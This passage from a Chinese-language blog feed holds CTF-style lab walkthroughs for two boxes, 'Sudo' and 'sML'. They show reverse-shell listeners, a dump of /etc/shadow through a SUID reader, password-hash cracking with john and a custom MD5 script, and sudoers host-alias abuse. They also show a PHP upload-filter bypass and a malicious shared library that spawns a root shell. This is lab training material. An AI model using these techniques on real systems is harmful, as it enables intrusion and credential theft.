┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nc -lnvp 8888                                       
listening on [any] 8888 ...

```

![image-20250711175447900](https://7r1umphk.github.io/image/20250711175448104.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nc -lnvp 8888                                       
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.175] 55696
Linux Sudo 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
 05:54:36 up 12 min,  0 users,  load average: 0.40, 4.74, 3.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (414): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Sudo:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Sudo:/$ cd /h
cd /home/
www-data@Sudo:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jul  9 04:41 .
drwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..
drwxr-xr-x  2 eecho eecho 4096 Jul  9 04:42 eecho
www-data@Sudo:/home$ cd ee
cd eecho/
www-data@Sudo:/home/eecho$ ls -al
ls -al
total 24
drwxr-xr-x 2 eecho eecho 4096 Jul  9 04:42 .
drwxr-xr-x 3 root  root  4096 Jul  9 04:41 ..
lrwxrwxrwx 1 root  root     9 Jul  9 04:42 .bash_history -&gt; /dev/null
-rw-r--r-- 1 eecho eecho  220 Jul  9 04:41 .bash_logout
-rw-r--r-- 1 eecho eecho 3526 Jul  9 04:41 .bashrc
-rw-r--r-- 1 eecho eecho  807 Jul  9 04:41 .profile
-rw-r--r-- 1 root  root    44 Jul  9 04:42 user.txt
www-data@Sudo:/home/eecho$ su eecho
su eecho
Password: eecho
su: Authentication failure
www-data@Sudo:/home/eecho$ cat user.txt
cat user.txt
flag{user-e1930b4927e6b6d92d120c7c1bba3421}
www-data@Sudo:/home/eecho$ cd /opt 
cd /opt
www-data@Sudo:/opt$ ls -al
ls -al
total 8
drwxr-xr-x  2 root root 4096 Apr  1 08:59 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
www-data@Sudo:/opt$ find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/read_file
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

/usr/bin/read_file

```
www-data@Sudo:/opt$ ls -al /usr/bin/read_file
ls -al /usr/bin/read_file
-rwsr-sr-x 1 root root 17528 Jul  9 05:01 /usr/bin/read_file
www-data@Sudo:/opt$ strings /usr/bin/read_file
strings /usr/bin/read_file
/lib64/ld-linux-x86-64.so.2
4hhl
strncmp
perror
puts
printf
strlen
read
getopt
realpath
optarg
stderr
fwrite
close
open
__cxa_finalize
__libc_start_main
__xstat
__lxstat
libc.so.6
GLIBC_2.3
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
hu)H
[]A\A]A^A_
Usage: %s -f &lt;filepath&gt;
Options:
  -h         Show this help message
  -f &lt;file&gt;  Specify the file to view (must be under /etc)
Security restrictions:
  - File path must start with /etc/
  - Symbolic links and path traversal are blocked
  - Only regular files can be read
/etc/
Error: No arguments provided
Error: No file specified
Error: Path must start with /etc/
Error resolving path
Error: Resolved path is not under /etc/
Error checking file status
Error: Symbolic links are not allowed
Error checking resolved file
Error: Only regular files are allowed
Error opening file
Error reading file
Error writing to stdout
;*3$'
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
read_file.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
__stat
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
strlen@GLIBC_2.2.5
__lxstat@GLIBC_2.2.5
printf@GLIBC_2.2.5
close@GLIBC_2.2.5
read@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
__data_start
is_etc_directory
optarg@GLIBC_2.2.5
__gmon_start__
__dso_handle
realpath@GLIBC_2.3
_IO_stdin_used
__xstat@GLIBC_2.2.5
__libc_csu_init
__bss_start
main
__lstat
open@GLIBC_2.2.5
perror@GLIBC_2.2.5
getopt@GLIBC_2.2.5
print_help
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
stderr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

还有帮助文档，不错不错

```
www-data@Sudo:/opt$ /usr/bin/read_file -f /etc/shadow
/usr/bin/read_file -f /etc/shadow
root:$y$j9T$8u7tw.ivXZkGdXyV0Fs.d/$FfzoOYYu8sRq7K2smsiRh5UGsVU2mI8.Q3Vmk0VtzUA:20190:0:99999:7:::
daemon:*:20166:0:99999:7:::
bin:*:20166:0:99999:7:::
sys:*:20166:0:99999:7:::
sync:*:20166:0:99999:7:::
games:*:20166:0:99999:7:::
man:*:20166:0:99999:7:::
lp:*:20166:0:99999:7:::
mail:*:20166:0:99999:7:::
news:*:20166:0:99999:7:::
uucp:*:20166:0:99999:7:::
proxy:*:20166:0:99999:7:::
www-data:*:20166:0:99999:7:::
backup:*:20166:0:99999:7:::
list:*:20166:0:99999:7:::
irc:*:20166:0:99999:7:::
gnats:*:20166:0:99999:7:::
nobody:*:20166:0:99999:7:::
_apt:*:20166:0:99999:7:::
systemd-timesync:*:20166:0:99999:7:::
systemd-network:*:20166:0:99999:7:::
systemd-resolve:*:20166:0:99999:7:::
systemd-coredump:!!:20166::::::
messagebus:*:20166:0:99999:7:::
sshd:*:20166:0:99999:7:::
eecho:$6$mL.9/fVsBqItNR..$GyJfKOjLcovjApxygZ79CjKcqJmJ37jC8y9KeLq81fLAnNCYVP1Nw9d8Dp9pZi/l3CWJ3PHL1l/Hld3sFmZoQ.:20278:0:99999:7:::
```

爆出了一个eecho

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Warning: detected hash type 'sha512crypt', but the string is also recognized as 'HMAC-SHA256'
Use the '--format=HMAC-SHA256' option to force loading these as that type instead
Warning: detected hash type 'sha512crypt', but the string is also recognized as 'HMAC-SHA512'
Use the '--format=HMAC-SHA512' option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexis15         (eecho)     
1g 0:00:00:01 DONE (2025-07-11 06:00) 0.5263g/s 26947p/s 26947c/s 26947C/s truckin..choccy
Use the '--show' option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat hash
eecho:$6$mL.9/fVsBqItNR..$GyJfKOjLcovjApxygZ79CjKcqJmJ37jC8y9KeLq81fLAnNCYVP1Nw9d8Dp9pZi/l3CWJ3PHL1l/Hld3sFmZoQ.
             
```

登录

```
www-data@Sudo:/opt$ su eecho
su eecho
Password: alexis15
id
uid=1000(eecho) gid=1000(eecho) groups=1000(eecho)
echo $0
bash
```

稳固

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

看看有没有信息

```
eecho@Sudo:~$ ls -al
total 24
drwxr-xr-x 2 eecho eecho 4096 Jul  9 04:42 .
drwxr-xr-x 3 root  root  4096 Jul  9 04:41 ..
lrwxrwxrwx 1 root  root     9 Jul  9 04:42 .bash_history -&gt; /dev/null
-rw-r--r-- 1 eecho eecho  220 Jul  9 04:41 .bash_logout
-rw-r--r-- 1 eecho eecho 3526 Jul  9 04:41 .bashrc
-rw-r--r-- 1 eecho eecho  807 Jul  9 04:41 .profile
-rw-r--r-- 1 root  root    44 Jul  9 04:42 user.txt
eecho@Sudo:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for eecho: 
Sorry, user eecho may not run sudo on Sudo.
```

啊这，我还以为出sudo题呢，不是那就是read那个有问题
居然靶机叫sudo，不是sudo -l，那会不会是/etc/sudoers有问题

看看

```
eecho@Sudo:~$ /usr/bin/read_file -f /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
eecho Dashazi = NOPASSWD:ALL
# See sudoers(5) for more information on '@include' directives:

@includedir /etc/sudoers.d
```

还真是

它需要Dashazi的主机别名才生效

```
eecho@Sudo:~$ hostname
Sudo
eecho@Sudo:~$ sudo -h Dashazi /bin/bash
sudo: unable to resolve host Dashazi: Name or service not known
root@Sudo:/home/eecho# id
uid=0(root) gid=0(root) groups=0(root)
root@Sudo:/home/eecho# cat /root/root.txt 
flag{root}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sudo.html</guid><pubDate>Fri, 11 Jul 2025 13:32:15 +0000</pubDate></item><item><title>内部_sML</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sML.html</link><description>![image-20250710215549207](https://7r1umphk.github.io/image/20250710215556665.webp)

复盘一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l  
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.174 08:00:27:a4:3b:3c       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 09:56 EDT
Nmap scan report for 192.168.205.174
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:A4:3B:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
                            
```

看web

![image-20250710215727831](https://7r1umphk.github.io/image/20250710215727984.webp)

试了一下弱密码，发现可以爆破user

![image-20250710215818476](https://7r1umphk.github.io/image/20250710215818575.webp)

爆破的同时看了一下源码，发现了他是使用的模板

![image-20250710215849837](https://7r1umphk.github.io/image/20250710215850057.webp)

下载一份

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
--2025-07-10 09:59:34--  https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
正在解析主机 www.sourcecodester.com (www.sourcecodester.com)... 172.67.190.48, 104.21.19.206, 2606:4700:3030::ac43:be30, ...
正在连接 www.sourcecodester.com (www.sourcecodester.com)|172.67.190.48|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：1391869 (1.3M) [application/zip]
正在保存至: “employee_records_system.zip”

employee_records_system.zip                  100%[============================================================================================&gt;]   1.33M   200KB/s  用时 6.8s    

2025-07-10 09:59:44 (200 KB/s) - 已保存 “employee_records_system.zip” [1391869/1391869])

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ unzip employee_records_system.zip
Archive:  employee_records_system.zip
   creating: employee_records_system/css/
  inflating: employee_records_system/css/font-awesome.css  
  inflating: employee_records_system/css/font-awesome.min.css  
   creating: employee_records_system/css/images/
  inflating: employee_records_system/css/images/ui-icons_444444_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_555555_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_777620_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_777777_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_cc0000_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_ffffff_256x240.png  
  inflating: employee_records_system/css/jquery-ui.css  
  inflating: employee_records_system/css/style.css  
   creating: employee_records_system/dashboard/
  inflating: employee_records_system/dashboard/add_employee.php  
  inflating: employee_records_system/dashboard/add_user.php  
  inflating: employee_records_system/dashboard/addemployee.php  
  inflating: employee_records_system/dashboard/adduser.php  
  inflating: employee_records_system/dashboard/current_employees.php  
  inflating: employee_records_system/dashboard/edit_employee.php  
  inflating: employee_records_system/dashboard/editemployee.php  
  inflating: employee_records_system/dashboard/getData.php  
  inflating: employee_records_system/dashboard/index.php  
  inflating: employee_records_system/dashboard/logout.php  
  inflating: employee_records_system/dashboard/past_employees.php  
  inflating: employee_records_system/dashboard/retrievedata.php  
  inflating: employee_records_system/dashboard/settings.php  
  inflating: employee_records_system/dashboard/uploadID.php  
  inflating: employee_records_system/dashboard/uploadimage.php  
   creating: employee_records_system/database file/
  inflating: employee_records_system/database file/sharp_db.sql  
   creating: employee_records_system/fonts/
  inflating: employee_records_system/fonts/FontAwesome.otf  
  inflating: employee_records_system/fonts/fontawesome-webfont.eot  
  inflating: employee_records_system/fonts/fontawesome-webfont.svg  
  inflating: employee_records_system/fonts/fontawesome-webfont.ttf  
  inflating: employee_records_system/fonts/fontawesome-webfont.woff  
  inflating: employee_records_system/fonts/fontawesome-webfont.woff2  
   creating: employee_records_system/images/
  inflating: employee_records_system/images/body_bg.jpg  
  inflating: employee_records_system/images/logo.png  
  inflating: employee_records_system/images/print.png  
  inflating: employee_records_system/images/times.png  
   creating: employee_records_system/inc/
  inflating: employee_records_system/inc/db_connect.php  
  inflating: employee_records_system/inc/header.php  
  inflating: employee_records_system/index.php  
   creating: employee_records_system/js/
  inflating: employee_records_system/js/global.js  
  inflating: employee_records_system/js/jquery.mask.js  
  inflating: employee_records_system/js/jquery.min.js  
  inflating: employee_records_system/js/jquery-ui.min.js  
   creating: employee_records_system/phpclasses/
  inflating: employee_records_system/phpclasses/pagination.php  
  inflating: employee_records_system/READme.md  
   creating: employee_records_system/uploads/
   creating: employee_records_system/uploads/employees_ids/
  inflating: employee_records_system/uploads/employees_ids/76xq1kHzYEaSZum_47446233-clean-noir-et-gradient-sombre-image-de-fond-abstrait-.jpg  
  inflating: employee_records_system/uploads/employees_ids/JeytInUiX9OuLEx_no-image-available.png  
   creating: employee_records_system/uploads/employees_photos/
  inflating: employee_records_system/uploads/employees_photos/G2IHhlrobeUFmQB_ava.jpg  
  inflating: employee_records_system/uploads/employees_photos/i0e2fodkG79IDU8_ava.jpg  
  inflating: employee_records_system/uploads/employees_photos/ZtYMgxRNGcFn9SQ_avatar.jpg  
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd employee_records_system 
                                     
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/employee_records_system]
└─$ ls -al
总计 25
drwxr-xr-x 1 kali kali 4096  7月10日 09:59  .
drwxr-xr-x 1 kali kali 8192  7月10日 09:59  ..
drwxr-xr-x 1 kali kali    0 2017年 5月21日  css
drwxr-xr-x 1 kali kali 4096 2017年 5月21日  dashboard
drwxr-xr-x 1 kali kali    0 2017年 5月21日 'database file'
drwxr-xr-x 1 kali kali 4096 2017年 5月21日  fonts
drwxr-xr-x 1 kali kali    0 2017年 5月21日  images
drwxr-xr-x 1 kali kali    0 2017年 5月21日  inc
-rwxr-xr-x 1 kali kali 4037 2021年 2月24日  index.php
drwxr-xr-x 1 kali kali    0 2017年 5月21日  js
drwxr-xr-x 1 kali kali    0 2017年 5月21日  phpclasses
-rwxr-xr-x 1 kali kali  598 2017年 5月21日  READme.md
drwxr-xr-x 1 kali kali    0 2017年 5月21日  uploads
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/employee_records_system]
└─$ cd 'database file'        
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/x/tmp/employee_records_system/database file]
└─$ ls -al
总计 7
drwxr-xr-x 1 kali kali    0 2017年 5月21日 .
drwxr-xr-x 1 kali kali 4096  7月10日 09:59 ..
-rwxr-xr-x 1 kali kali 2411 2021年 2月24日 sharp_db.sql
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/x/tmp/employee_records_system/database file]
└─$ cat sharp_db.sql  
-- phpMyAdmin SQL Dump
-- version 4.5.2
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: May 20, 2017 at 04:21 PM
-- Server version: 5.7.9
-- PHP Version: 5.6.16

SET SQL_MODE = 'NO_AUTO_VALUE_ON_ZERO';
SET time_zone = '+00:00';


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `sharp_db`
--

-- --------------------------------------------------------

--
-- Table structure for table `sharp_emp`
--

DROP TABLE IF EXISTS `sharp_emp`;
CREATE TABLE IF NOT EXISTS `sharp_emp` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `employee_id` text,
  `first_name` text NOT NULL,
  `middle_name` text,
  `last_name` text NOT NULL,
  `phone` int(11) NOT NULL,
  `employee_image` text NOT NULL,
  `id_type` text NOT NULL,
  `id_number` text NOT NULL,
  `id_card_image` text NOT NULL,
  `residence_address` text NOT NULL,
  `residence_location` text NOT NULL,
  `residence_direction` text NOT NULL,
  `residence_gps` text NOT NULL,
  `next_of_kin` text NOT NULL,
  `relationship` text NOT NULL,
  `phone_of_kin` text NOT NULL,
  `kin_residence` text NOT NULL,
  `kin_residence_direction` text NOT NULL,
  `date_employed` date NOT NULL,
  `job_type` text NOT NULL,
  `status` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `firstname` text NOT NULL,
  `lastname` text NOT NULL,
  `username` text NOT NULL,
  `password` text NOT NULL,
  `accounttype` text NOT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`user_id`, `firstname`, `lastname`, `username`, `password`, `accounttype`) VALUES
(1, 'Maxwell', 'Morrison', 'xxx2xy', '10a55271c201e41913764ff95b33248b', 'Admin'),
(3, 'Maxwell', 'Morrison', 'admins', '02adcdf2171dc7e5757cdd7c0b91fa03', 'Admin');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
                                       
```

发现了两个用户，和密码哈希（这个密码hash直接拿去john爆破不出来，因为它是(MD5(MD5(password)+MD5(username)))这种架构，这里我没有尝试你们可以尝试一下，还要群里的佬说有一个poc可以利用，我也没有尝试，感兴趣的可以看一下`https://www.exploit-db.com/exploits/49596`），然后我就直接拿admins用户去burp爆破密码了，因为它是默认密码，而且这个模板好像是8年前的，大概率是弱密码来的

密码是admin123

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ grep -w -n 'admin123' xato-net-10-million-passwords-100000.txt 
15582:admin123
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ grep -w -n 'admin123' rockyou.txt                             
90006:admin123
10357629:admin123*
```

挺后的，所以直接打poc是最快的

如果你跟我一样登录进来的，点add employee然后照片那里先传一个reverse.png(反弹shell php文件)上去，然后抓包改名就好了，它就只做了前端校验

开抓包
![image-20250710221057739](https://7r1umphk.github.io/image/20250710221057836.webp)

改包

![image-20250710221154470](https://7r1umphk.github.io/image/20250710221154732.webp)

放行

目录扫描看看上传目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.174 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.174
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.174/images/]
/uploads              (Status: 301) [Size: 320] [--&gt; http://192.168.205.174/uploads/]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.174/css/]
/index.php            (Status: 200) [Size: 1926]
/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.174/js/]
/inc                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.174/inc/]
/fonts                (Status: 301) [Size: 318] [--&gt; http://192.168.205.174/fonts/]
/dashboard            (Status: 301) [Size: 322] [--&gt; http://192.168.205.174/dashboard/]
Progress: 34475 / 1102800 (3.13%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 35514 / 1102800 (3.22%)
===============================================================
Finished
===============================================================
                      
```

![image-20250710221300132](https://7r1umphk.github.io/image/20250710221300285.webp)

kali开监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...

```

触发

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.174] 54352
Linux sML 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
 10:13:26 up 18 min,  0 users,  load average: 0.38, 0.16, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (430): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sML:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

找提权

```
www-data@sML:/$ cd /h
cd /home/yulian/
www-data@sML:/home/yulian$ ls -al
ls -al
total 44
drwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .
drwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..
lrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -&gt; /dev/null
-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout
-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc
-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile
-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root
-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt
www-data@sML:/home/yulian$ cat us
cat user.txt 
flag{user-fde7951c3a57bc71b03631a9673ab67e}
www-data@sML:/home/yulian$ strings get_root
strings get_root
/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
hello
puts
__cxa_finalize
__libc_start_main
libxxoo.so
libc.so.6
GLIBC_2.2.5
/usr/lib/sML
u/UH
[]A\A]A^A_
Starting get_root program...
;*3$'
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
get_root.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
__libc_start_main@GLIBC_2.2.5
hello
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

群主那个xxoo真是太醒目了
![image-20250710222034547](https://7r1umphk.github.io/image/20250710222034668.webp)

那就动态链接库劫持吧

```
www-data@sML:/home/yulian$ ls -al /usr/lib/sML
ls -al /usr/lib/sML
total 24
drwxr-xr-x  2 root root  4096 Jul  7 06:32 .
drwxr-xr-x 71 root root  4096 Jul  7 06:29 ..
-rwxrwxrwx  1 root root 15984 Jul  7 06:30 libxxoo.so
www-data@sML:/home/yulian$ cd /tmp
cd /tmp
www-data@sML:/tmp$ cat &lt;&lt; EOF &gt; shell.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void hello() {
    setuid(0);
    setgid(0);
    system('/bin/bash -p');
}
EOFcat &lt;&lt; EOF &gt; shell.c
&gt; #include &lt;stdio.h&gt;
&gt; #include &lt;stdlib.h&gt;
&gt; #include &lt;unistd.h&gt;
&gt; 
&gt; void hello() {
&gt;     setuid(0);
&gt;     setgid(0);
&gt;     system('/bin/bash -p');
&gt; }
&gt; 
EOF
www-data@sML:/tmp$ gcc -shared -o libxxoo.so -fPIC shell.c
gcc -shared -o libxxoo.so -fPIC shell.c
www-data@sML:/tmp$ cp libxxoo.so /usr/lib/sML/
cp libxxoo.so /usr/lib/sML/
www-data@sML:/tmp$ cd /h 
cd /home/yulian/
www-data@sML:/home/yulian$ ls -al
ls -al
total 44
drwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .
drwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..
lrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -&gt; /dev/null
-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout
-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc
-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile
-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root
-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt
www-data@sML:/home/yulian$ ./get_root
./get_root
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
cat /root/root.txt
flag{root-4c850c5b3b2756e67a91bad8e046ddac}
```

爆破hash参考代码

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat a.py           
import hashlib

def crack():
    u = 'admins'
    h = '02adcdf2171dc7e5757cdd7c0b91fa03'
    w = r'/usr/share/wordlists/rockyou.txt'

    umd5 = hashlib.md5(u.encode()).hexdigest()

    try:
        with open(w, 'r', encoding='latin-1') as f:
            for line in f:
                p = line.strip()
                pm = hashlib.md5(p.encode()).hexdigest()
                cm = hashlib.md5((pm + umd5).encode()).hexdigest()
                if cm == h:
                    print(f'[+] 密码找到: {p}')
                    return
        print('[-] 未找到')
    except:
        print('文件错误')

if __name__ == '__main__':
    crack()
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 a.py
[+] 密码找到: admin123
                                                 
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sML.html</guid><pubDate>Thu, 10 Jul 2025 14:40:33 +0000</pubDate></item><item><title>内部_Backdoor1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Backdoor1.html</link><description>![image-20250709215624782](https://7r1umphk.github.io/image/20250709215633404.webp)

打一个睡觉

```
